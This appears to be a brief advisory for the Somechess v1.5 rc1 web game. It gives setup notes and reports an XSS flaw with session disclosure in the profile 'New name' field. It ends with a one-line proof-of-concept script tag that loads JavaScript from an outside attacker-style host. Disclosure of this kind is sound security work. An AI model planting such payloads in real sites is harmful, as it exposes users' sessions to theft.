Somechess v1.5 rc1

Homepage:
http://www.astrodogpress.org/chess/

Affected files:

*Profile input boxes
-----------------------

Upon dumping the sql data into the table if you get errors and it wont create the tables & data (like it did to me), then just remove all the " from the sql file. You'll also have to manually add players & their pw's (md5 hashed) via phpmyadmin or whatever you use. Theres also a php error on menu.php that you'll have to fix since it won't allow you to connect to  the game DB
-----------------------

XSS vuln with session disclosure from "New name" profile input box.

Data isn't sanatized before being generated. PoC:

<SCRIPT SRC=http://youfucktard.com/xss.js></SCRIPT>
